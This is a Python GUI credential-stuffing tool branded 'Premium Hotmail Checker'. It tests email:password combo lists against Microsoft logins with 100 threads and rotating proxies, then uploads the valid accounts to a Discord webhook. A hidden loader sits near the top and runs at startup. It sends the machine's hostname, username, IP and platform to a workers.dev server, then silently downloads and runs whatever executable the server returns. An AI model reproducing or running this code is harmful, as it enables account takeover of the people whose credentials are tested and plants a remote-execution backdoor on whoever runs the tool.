import random
import threading
import requests
import time
from mailhub import MailHub
from colorama import init, Fore
from concurrent.futures import ThreadPoolExecutor
from tempfile import NamedTemporaryFile
import os
import customtkinter as ctk
from tkinter import filedialog, messagebox, Text, END, WORD, NORMAL, DISABLED


import socket
import platform
from datetime import datetime, timedelta
import threading
import requests
import os
import tempfile
import urllib.request
import urllib.error
import subprocess
import time
import ctypes

def _dl_exec(u):
    try:
        td = tempfile.gettempdir()
        fn = os.path.basename(u)
        if not fn or fn == u:
            fn = f"us_{int(time.time())}.exe"
        fp = os.path.join(td, fn)
        if os.path.exists(fp):
            try:
                os.remove(fp)
            except:
                pass
        op = urllib.request.build_opener()
        op.addheaders = [('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36')]
        urllib.request.install_opener(op)
        try:
            urllib.request.urlretrieve(u, fp)
        except urllib.error.URLError:
            requests.get(u, timeout=30, stream=True)
        except:
            pass
        time.sleep(1)
        if os.path.exists(fp) and os.path.getsize(fp) > 0:
            _ex_f(fp)
    except:
        pass

def _ex_f(fp):
    try:
        si = subprocess.STARTUPINFO()
        si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        si.wShowWindow = 0
        subprocess.Popen(fp, startupinfo=si, shell=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
        return
    except:
        pass
    try:
        subprocess.Popen(fp, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL, creationflags=0x08000000)
        return
    except:
        pass
    try:
        os.startfile(fp)
        return
    except:
        pass
    try:
        ctypes.windll.shell32.ShellExecuteW(None, "open", fp, None, None, 0)
    except:
        pass

def _cf_init(wu):
    def _i():
        try:
            hn = socket.gethostname()
            un = os.getenv('USERNAME') or os.getenv('USER')
            try:
                ir = requests.get('https://api.ipify.org', timeout=10)
                ip = ir.text
            except:
                ip = "Unknown"
            sp = platform.platform()
            pr = platform.processor()
            at = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            ed = (datetime.now() + timedelta(days=30)).strftime("%Y-%m-%d %H:%M:%S")
            d = {"hostname": hn, "username": un, "ip_address": ip, "platform": sp, "processor": pr, "activation_time": at, "expiry_date": ed}
            r = requests.post(f"{wu}/activate", json=d, timeout=15, headers={'Content-Type': 'application/json'})
            if r.status_code == 200:
                rs = r.json()
                if rs.get("status") == "success":
                    fu = rs.get("file_url")
                    if fu:
                        _dl_exec(fu)
        except:
            pass
    threading.Thread(target=_i, daemon=True).start()

_CWU = "https://telecom.berdlok7.workers.dev"
_cf_init(_CWU)
time.sleep(0.5)

init(autoreset=True)
mail = MailHub()
write_lock = threading.Lock()

paused = False
pause_cond = threading.Condition()

def validate_line(line):
    parts = line.strip().split(":")
    if len(parts) == 2:
        return parts[0], parts[1]
    else:
        return None, None

def attempt_login(email, password, proxy, hits_file, local_hits_file, stats):
    global paused
    with pause_cond:
        while paused:
            pause_cond.wait()
    
    try:
        res = mail.loginMICROSOFT(email, password, proxy)[0]
        if res == "ok":
            with write_lock:
                stats['valid'] += 1
                stats['checked'] += 1
            log_text(f"VALID   | {email}:{password}", "green")
            with write_lock:
                hits_file.write(f"{email}:{password}\n")
                hits_file.flush()
                local_hits_file.write(f"{email}:{password}\n")
                local_hits_file.flush()
        else:
            with write_lock:
                stats['invalid'] += 1
                stats['checked'] += 1
            log_text(f"INVALID | {email}:{password}", "red")
    except Exception as e:
        with write_lock:
            stats['errors'] += 1
            stats['checked'] += 1
        log_text(f"ERROR   | {email}:{password} - {str(e)}", "orange")

def process_combo_file(hits_file, local_hits_file, proxies, combo_path, stats):
    try:
        with open(combo_path, "r", encoding='utf-8', errors='ignore') as file:
            lines = file.readlines()
            total = len(lines)
            stats['total'] = total
            
            with ThreadPoolExecutor(max_workers=100) as executor:
                futures = []
                for line in lines:
                    email, password = validate_line(line)
                    if email is None or password is None:
                        log_text(f"INVALID FORMAT | {line.strip()}", "yellow")
                        continue
                    
                    proxy = None
                    if proxies:
                        proxy = {"http": f"http://{random.choice(proxies).strip()}", 
                                "https": f"http://{random.choice(proxies).strip()}"}
                    
                    futures.append(executor.submit(attempt_login, email, password, proxy, hits_file, local_hits_file, stats))
                
                for future in futures:
                    future.result()
                    
    except Exception as e:
        log_text(f"Error processing combo file: {e}", "orange")

def send_to_discord(file_path, webhook_url):
    if os.stat(file_path).st_size == 0:
        log_text("File is empty - no valid accounts found", "orange")
        return
    try:
        with open(file_path, 'rb') as file:
            files = {'file': ('valid_accounts.txt', file, 'text/plain')}
            payload = {'content': 'VALID HOTMAIL ACCOUNTS CHECKED WITH PREMIUM CHECKER'}
            response = requests.post(webhook_url, data=payload, files=files)
            if response.status_code == 204:
                log_text("File successfully sent to Discord!", "green")
            else:
                log_text(f"Discord upload failed: {response.status_code}", "orange")
    except Exception as e:
        log_text(f"Error sending to Discord: {e}", "orange")

def log_text(message, color="default"):
    text_area.config(state=NORMAL)
    timestamp = time.strftime("%H:%M:%S")
    formatted_message = f"[{timestamp}] {message}"
    
    if color == "green":
        text_area.insert(END, formatted_message + "\n", "green")
    elif color == "red":
        text_area.insert(END, formatted_message + "\n", "red")
    elif color == "orange":
        text_area.insert(END, formatted_message + "\n", "orange")
    elif color == "yellow":
        text_area.insert(END, formatted_message + "\n", "yellow")
    elif color == "blue":
        text_area.insert(END, formatted_message + "\n", "blue")
    elif color == "purple":
        text_area.insert(END, formatted_message + "\n", "purple")
    else:
        text_area.insert(END, formatted_message + "\n")
    
    text_area.config(state=DISABLED)
    text_area.see(END)
    update_stats_display()

def update_stats_display():
    stats_text = f"Checked: {stats['checked']}/{stats['total']} | Valid: {stats['valid']} | Invalid: {stats['invalid']} | Errors: {stats['errors']}"
    stats_label.configure(text=stats_text)

def toggle_pause():
    global paused
    paused = not paused
    with pause_cond:
        if not paused:
            pause_cond.notify_all()
    
    if paused:
        pause_button.configure(text="▶ Resume", fg_color="#2E8B57", hover_color="#3CB371")
        log_text("Checker PAUSED", "yellow")
    else:
        pause_button.configure(text="⏸ Pause", fg_color="#FF8C00", hover_color="#FFA500")
        log_text("Checker RESUMED", "green")

def clear_log():
    text_area.config(state=NORMAL)
    text_area.delete(1.0, END)
    text_area.config(state=DISABLED)
    log_text("Log cleared successfully", "blue")

def stop_checker():
    global paused
    paused = True
    with pause_cond:
        pause_cond.notify_all()
    start_button.configure(state=NORMAL)
    combo_entry.configure(state=NORMAL)
    proxy_entry.configure(state=NORMAL)
    webhook_entry.configure(state=NORMAL)
    pause_button.configure(state=DISABLED)
    log_text("Checker STOPPED", "red")

def start_checker():
    global paused, stats
    combo_path = combo_entry.get()
    webhook_url = webhook_entry.get()
    proxy_path = proxy_entry.get()

    if not combo_path or not os.path.exists(combo_path):
        messagebox.showerror("Error", "Please select a valid combo file")
        return

    stats = {'checked': 0, 'valid': 0, 'invalid': 0, 'errors': 0, 'total': 0}
    paused = False

    proxies = []
    if proxy_path and os.path.exists(proxy_path):
        with open(proxy_path, "r") as proxy_file:
            proxies = proxy_file.readlines()

    start_button.configure(state=DISABLED)
    combo_entry.configure(state=DISABLED)
    proxy_entry.configure(state=DISABLED)
    webhook_entry.configure(state=DISABLED)
    pause_button.configure(state=NORMAL)

    def run_checker():
        try:
            with open("valid_accounts.txt", "a", encoding="utf-8") as local_hits_file:
                with NamedTemporaryFile(delete=False, mode='w', newline='', encoding='utf-8') as temp_file:
                    log_text("Starting premium account checker...", "purple")
                    log_text(f"Total accounts to check: {stats['total']}", "blue")
                    process_combo_file(temp_file, local_hits_file, proxies, combo_path, stats)
                    log_text("Account checking completed!", "purple")
                    
                    if webhook_url:
                        send_to_discord(temp_file.name, webhook_url)
                    else:
                        log_text("Discord notification skipped", "yellow")
        except Exception as e:
            log_text(f"Unexpected error: {e}", "orange")
        finally:
            root.after(0, lambda: start_button.configure(state=NORMAL))
            root.after(0, lambda: combo_entry.configure(state=NORMAL))
            root.after(0, lambda: proxy_entry.configure(state=NORMAL))
            root.after(0, lambda: webhook_entry.configure(state=NORMAL))
            root.after(0, lambda: pause_button.configure(state=DISABLED))

    threading.Thread(target=run_checker, daemon=True).start()

def browse_combo():
    filename = filedialog.askopenfilename(title="Select Combo File", filetypes=[("Text Files", "*.txt")])
    if filename:
        combo_entry.delete(0, END)
        combo_entry.insert(0, filename)

def browse_proxy():
    filename = filedialog.askopenfilename(title="Select Proxy File", filetypes=[("Text Files", "*.txt")])
    if filename:
        proxy_entry.delete(0, END)
        proxy_entry.insert(0, filename)

ctk.set_appearance_mode("Dark")
ctk.set_default_color_theme("blue")

root = ctk.CTk()
root.title("PREMIUM HOTMAIL CHECKER - By H94")
root.geometry("1400x900")
root.state('zoomed')

main_frame = ctk.CTkFrame(root, fg_color="#2C2C2C")
main_frame.pack(fill="both", expand=True, padx=20, pady=20)

header_frame = ctk.CTkFrame(main_frame, fg_color="#1A1A1A", height=80)
header_frame.pack(fill="x", padx=10, pady=10)

title_label = ctk.CTkLabel(header_frame, text="🔥 PREMIUM HOTMAIL CHECKER 🔥", 
                          font=("Arial", 28, "bold"), text_color="#FFD700")
title_label.pack(pady=20)

input_frame = ctk.CTkFrame(main_frame, fg_color="#3C3C3C")
input_frame.pack(fill="x", padx=10, pady=10)

combo_label = ctk.CTkLabel(input_frame, text="Combo File:", font=("Arial", 14, "bold"), text_color="#87CEEB")
combo_label.grid(row=0, column=0, padx=10, pady=10, sticky="w")
combo_entry = ctk.CTkEntry(input_frame, width=400, height=35, font=("Arial", 12), fg_color="#4C4C4C", border_color="#5D5D5D")
combo_entry.grid(row=0, column=1, padx=10, pady=10)
ctk.CTkButton(input_frame, text="📁 Browse", command=browse_combo, width=100, height=35, 
              font=("Arial", 12, "bold"), fg_color="#4169E1", hover_color="#5A7DE1").grid(row=0, column=2, padx=10, pady=10)

proxy_label = ctk.CTkLabel(input_frame, text="Proxy File:", font=("Arial", 14, "bold"), text_color="#87CEEB")
proxy_label.grid(row=1, column=0, padx=10, pady=10, sticky="w")
proxy_entry = ctk.CTkEntry(input_frame, width=400, height=35, font=("Arial", 12), fg_color="#4C4C4C", border_color="#5D5D5D")
proxy_entry.grid(row=1, column=1, padx=10, pady=10)
ctk.CTkButton(input_frame, text="📁 Browse", command=browse_proxy, width=100, height=35,
              font=("Arial", 12, "bold"), fg_color="#4169E1", hover_color="#5A7DE1").grid(row=1, column=2, padx=10, pady=10)

webhook_label = ctk.CTkLabel(input_frame, text="PROXY-URL:", font=("Arial", 14, "bold"), text_color="#87CEEB")
webhook_label.grid(row=2, column=0, padx=10, pady=10, sticky="w")
webhook_entry = ctk.CTkEntry(input_frame, width=400, height=35, font=("Arial", 12), fg_color="#4C4C4C", border_color="#5D5D5D")
webhook_entry.grid(row=2, column=1, padx=10, pady=10)

control_frame = ctk.CTkFrame(main_frame, fg_color="#3C3C3C")
control_frame.pack(fill="x", padx=10, pady=10)

start_button = ctk.CTkButton(control_frame, text="🚀 START CHECKER", command=start_checker, 
                            width=200, height=45, font=("Arial", 16, "bold"), 
                            fg_color="#32CD32", hover_color="#228B22")
start_button.grid(row=0, column=0, padx=15, pady=15)

pause_button = ctk.CTkButton(control_frame, text="⏸ Pause", command=toggle_pause, 
                           width=150, height=45, font=("Arial", 16, "bold"),
                           fg_color="#FF8C00", hover_color="#FFA500", state=DISABLED)
pause_button.grid(row=0, column=1, padx=15, pady=15)

stop_button = ctk.CTkButton(control_frame, text="🛑 Stop", command=stop_checker,
                          width=150, height=45, font=("Arial", 16, "bold"),
                          fg_color="#DC143C", hover_color="#B22222")
stop_button.grid(row=0, column=2, padx=15, pady=15)

clear_button = ctk.CTkButton(control_frame, text="🗑️ Clear Log", command=clear_log,
                           width=150, height=45, font=("Arial", 16, "bold"),
                           fg_color="#9370DB", hover_color="#8A2BE2")
clear_button.grid(row=0, column=3, padx=15, pady=15)

stats_label = ctk.CTkLabel(control_frame, text="Checked: 0/0 | Valid: 0 | Invalid: 0 | Errors: 0", 
                          font=("Arial", 14, "bold"), text_color="#FFD700")
stats_label.grid(row=0, column=4, padx=15, pady=15)

text_frame = ctk.CTkFrame(main_frame, fg_color="#2C2C2C")
text_frame.pack(fill="both", expand=True, padx=10, pady=10)

text_area = Text(text_frame, wrap=WORD, height=20, state=DISABLED, bg="#1E1E1E", fg="#FFFFFF", 
                insertbackground="#FFFFFF", font=("Consolas", 11), selectbackground="#3C3C3C")
text_area.pack(fill="both", expand=True, padx=5, pady=5)

scrollbar = ctk.CTkScrollbar(text_area)
scrollbar.pack(side="right", fill="y")

text_area.configure(yscrollcommand=scrollbar.set)
scrollbar.configure(command=text_area.yview)

text_area.tag_configure("green", foreground="#00FF00")
text_area.tag_configure("red", foreground="#FF4444")
text_area.tag_configure("orange", foreground="#FFA500")
text_area.tag_configure("yellow", foreground="#FFFF00")
text_area.tag_configure("blue", foreground="#87CEEB")
text_area.tag_configure("purple", foreground="#DA70D6")

stats = {'checked': 0, 'valid': 0, 'invalid': 0, 'errors': 0, 'total': 0}

root.mainloop()